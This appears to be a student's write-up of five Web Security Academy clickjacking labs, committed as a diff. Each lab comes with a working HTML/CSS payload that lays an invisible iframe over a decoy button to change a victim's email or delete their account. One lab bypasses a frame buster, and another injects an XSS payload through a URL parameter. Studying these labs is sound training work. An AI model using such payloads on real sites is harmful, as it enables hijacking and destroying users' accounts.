@@ -1,0 +1,168 @@
+Task 1:
+///Lab: Clickjacking with form input data prefilled from a URL parameter///
+
+So we are going to put an invisible button on the Update email button, so when the victim clicks on it, his/her email will change to our email automatically. 
+Our exploit:
+<style>
+    iframe {
+        position: relative;
+        width: 700px;
+        height: 700px;
+        opacity: 0.0001;
+        z-index: 2;
+    }
+    div {
+        position: absolute;
+        top: 475px; 
+        left: 32px;
+        z-index: 1;      
+        width: 130px;  
+        height: 38px; 
+        background-color: #008CBA;
+        color: white;
+        text-align: center;
+        line-height: 38px;
+        border-radius: 5px;
+        font-family: sans-serif;
+    }
+</style>
+
+<div>Click me</div>
+<iframe src="https://0abb007d03cc702c800d033000cf0017.web-security-academy.net/my-account?email=nyuszi@maci.hu"></iframe>
+
+Task 2:
+///Lab: Basic clickjacking with CSRF token protection///
+
+We have to do the same, just instead of updateing the accounts email, we will deleting the account...:
+<style>
+    iframe {
+        position: relative;
+        width: 700px;
+        height: 700px;
+        opacity: 0.1;
+        z-index: 2;
+    }
+    div {
+        position: absolute;
+        top: 495px; 
+        left: 32px;
+        z-index: 1;      
+        width: 130px;  
+        height: 38px; 
+        background-color: #008CBA;
+        color: white;
+        text-align: center;
+        line-height: 38px;
+        border-radius: 5px;
+        font-family: sans-serif;
+    }
+</style>
+
+<div>Click me</div>
+<iframe src="https://0a01000004dfeaa28014262800030035.web-security-academy.net/my-account"></iframe>
+
+Task 3:
+///Lab: Clickjacking with a frame buster script///
+
+So there is a frame buster defence on the webapp. And we have to change the email. So we can use our payload again:
+<style>
+    iframe {
+        position: relative;
+        width: 700px;
+        height: 700px;
+        opacity: 0.0001;
+        z-index: 2;
+    }
+    div {
+        position: absolute;
+        top: 450px; 
+        left: 40px;
+        z-index: 1;      
+        width: 130px;  
+        height: 38px; 
+        background-color: #008CBA;
+        color: white;
+        text-align: center;
+        line-height: 38px;
+        border-radius: 5px;
+        font-family: sans-serif;
+    }
+</style>
+
+<div>Click me</div>
+<iframe sandbox="allow-forms" src="https://0a1f0049040516528039670f00380018.web-security-academy.net/my-account?email=nyuszi@maci.hu"></iframe>
+
+The difference part is: sandbox="allow-forms". With this added attribute we dont allow the webapp to run his defending javascript (frame buster), but with allow-forms we allow ourself to run any data we send...
+
+Task 4:
+///Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS///
+
+Click on submit feedback, and make a feedback. After you click on submint feedback, you will get a response:
+"Thank you for submitting feedback, name!"  >>>this gives back our name, so from the title i suggest that if we change our name to a malicious script, it will gives us back. We will use the <img src=1 onerror=arlert()>
+script to test it...so make another feedback, but the name has to be our script.
+And yeah we got back an alert,after we submit the feedback.
+Now go to exploit server, and use our payload from before:
+<style>
+    iframe {
+        position: relative;
+        width: 1500px;
+        height: 1000px;
+        opacity: 0.0001;
+        z-index: 2;
+    }
+    div {
+        position: absolute;
+        top: 825px; 
+        left: 200px;
+        z-index: 1;      
+        width: 130px;  
+        height: 38px; 
+        background-color: #008CBA;
+        color: white;
+        text-align: center;
+        line-height: 38px;
+        border-radius: 5px;
+        font-family: sans-serif;
+    }
+</style>
+
+<div>Click me</div>
+<iframe src="https://0ad100b304a34066801403b600990020.web-security-academy.net/feedback?name=<img src=0 onerror=print()>&email=valami@valami.hu&subject=asd&message=bakker"></iframe>
+This payload will automatically modify the feedback parts,(name, email, subject,message >>>these are in the source like: <input required="" type="text" name="subject">), put the name as a print script
+(this is what the lab asked)
+
+Task 5:
+///Lab: Multistep clickjacking///
+
+Log in, go to my account and click on delete account. There is a confirmation page, so we have to confirm that we want to delete our account. We can play this our with two automatic clicking in our payload:
+<style>
+    iframe {
+        position: relative;
+        width: 700px;
+        height: 700px;
+        opacity: 0.0001;
+        z-index: 2;
+    }
+   .firstClick, .secondClick {
+        position: absolute;
+        top: 485px; 
+        left: 32px;
+        z-index: 1;      
+        width: 130px;  
+        height: 38px; 
+        background-color: #008CBA;
+        color: white;
+        text-align: center;
+        line-height: 38px;
+        border-radius: 5px;
+        font-family: sans-serif;
+}
+   .secondClick {
+		    top:285px;
+		    left:190px;
+}
+</style>
+
+<div class="firstClick">Click me first</div>
+<div class="secondClick">Click me next</div>
+<iframe src="https://0a38009604955a5d8092034b003600e6.web-security-academy.net/my-account"></iframe>
